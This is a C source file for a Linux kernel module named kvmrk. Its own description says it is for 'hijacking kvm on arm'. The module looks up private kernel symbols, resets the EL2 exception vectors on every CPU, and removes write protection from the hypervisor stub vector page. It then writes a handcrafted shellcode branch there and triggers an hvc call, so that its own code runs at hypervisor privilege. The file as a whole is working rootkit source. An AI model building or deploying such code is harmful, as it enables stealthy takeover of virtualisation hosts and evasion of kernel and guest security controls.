#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/smp.h>
#include <asm/kvm_host.h>
#include <asm/memory.h>

#include <asm/syscall.h>    // syscall_fn_t, __NR_*
#include <asm/ptrace.h>     // struct pt_regs
#include <asm/tlbflush.h>   // flush_tlb_kernel_range()
#include <asm/pgtable.h>    // {clear,set}_pte_bit(), set_pte()
#include <linux/vmalloc.h>  // vm_unmap_aliases()
#include <linux/mm.h>       // struct mm_struct, apply_to_page_range()
#include <linux/kconfig.h>  // IS_ENABLED()

#include "include/kvmrk.h"
#include "include/resolve_kallsyms.h"
#include "include/assembler.h"
#include "include/set_page_flags.h"

typedef long (*sched_setaffinity_t)(pid_t pid, const struct cpumask *in_mask);

static sched_setaffinity_t _sched_setaffinity = NULL;

long kvmrk_sched_setaffinity(pid_t pid, const struct cpumask *in_mask) {
    if (!_sched_setaffinity) {
        _sched_setaffinity = rk_kallsyms_lookup_name("sched_setaffinity");
    }

    return _sched_setaffinity(pid, in_mask);
}

extern char kvmrk_vector[];
extern void kvmrk_set_vectors(phys_addr_t phys_vector_base);
extern int kvmrk_reset_vectors(void);
extern void kvmrk_elx_sync(void);
extern void kvmrk_elx_sync_end(void);
extern void kvmrk_flush_virt(void *);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    /*
    int i;
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_reset_vectors();
        printk(KERN_INFO "kvmrk: reset vectors of cpu %i to hyp stub\n", smp_processor_id());
    }

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_set_vectors(__pa_symbol(kvmrk_vector));
        printk(KERN_INFO "kvmrk: set vectors of cpu %i to kvmrk stub\n", smp_processor_id());
    }
    printk(KERN_INFO "kvmrk: replaced vbar_el2 on all cpus\n");

    asm volatile("mov       x0, 5\n\t");
    asm volatile("hvc       #0\n\t");
    register unsigned long r asm("x0");
    printk(KERN_INFO "kvmrk: hvc returned %lx\n", r);
    */

    int i;
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_reset_vectors();
        register unsigned long r asm("x0");
        printk(KERN_INFO "kvmrk: reset vectors of cpu %i to hyp stub returned %i\n", smp_processor_id(), r);
    }

    void *kvmrk_elx_sync_copy_va = kmalloc(PAGE_SIZE, GFP_KERNEL);
    memcpy(kvmrk_elx_sync_copy_va, kvmrk_elx_sync, kvmrk_elx_sync_end - kvmrk_elx_sync);
    phys_addr_t kvmrk_elx_sync_copy_pa = virt_to_phys(kvmrk_elx_sync_copy_va);
    printk(KERN_INFO "kvmrk: kvmrk_elx_sync_copy_va is %lx\n", kvmrk_elx_sync_copy_va);
    printk(KERN_INFO "kvmrk: virt_to_phys(kvmrk_elx_sync_copy_va) is %lx\n", kvmrk_elx_sync_copy_pa);

    // kvmrk_flush_virt(kvmrk_elx_sync);
    // printk(KERN_INFO "kvmrk: kvmrk_elx_sync is %lx\n", kvmrk_elx_sync);
    // printk(KERN_INFO "kvmrk: virt_to_phys(kvmrk_elx_sync) is %lx\n", virt_to_phys(kvmrk_elx_sync));

    uint32_t shellcode[5];
    shellcode[4] = cpu_to_le32(0xd61f0180); // br x12
    assemble_absolute_load(0b1100, kvmrk_elx_sync_copy_pa, shellcode);

    uint8_t *__hyp_stub_vectors_base = (uint8_t *) rk_kallsyms_lookup_name("__hyp_stub_vectors");
    pte_t *ptep = virt_to_pte(__hyp_stub_vectors_base);
    if (!ptep) {
        printk(KERN_INFO "kvmrk: virt_to_pte failed...\n");
        return -1;
    }
    pte_flip_write_protect(ptep);
    flush_tlb_all();
    memcpy(__hyp_stub_vectors_base + 0x400, shellcode, 5 * KVMRK_INS_WIDTH);
    // memcpy(__hyp_stub_vectors_base + 0x400, kvmrk_elx_sync, 3 * KVMRK_INS_WIDTH);
    flush_cache_mm(init_mm_ptr);
    flush_tlb_all();
    kvmrk_flush_virt(__hyp_stub_vectors_base + 0x400);

    printk(KERN_INFO "kvmrk: dumping __hyp_stub_vectors\n");
    for (i = 0x400; i < 0x480; i += 4) {
        printk(KERN_INFO "      %02x %02x %02x %02x",
            __hyp_stub_vectors_base[i],
            __hyp_stub_vectors_base[i + 1],
            __hyp_stub_vectors_base[i + 2],
            __hyp_stub_vectors_base[i + 3]);
    }


    asm volatile("mov       x0, 5\n\t");
    asm volatile("hvc       #0\n\t");
    register unsigned long r asm("x0");
    printk(KERN_INFO "kvmrk: hvc returned %lx\n", r);

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
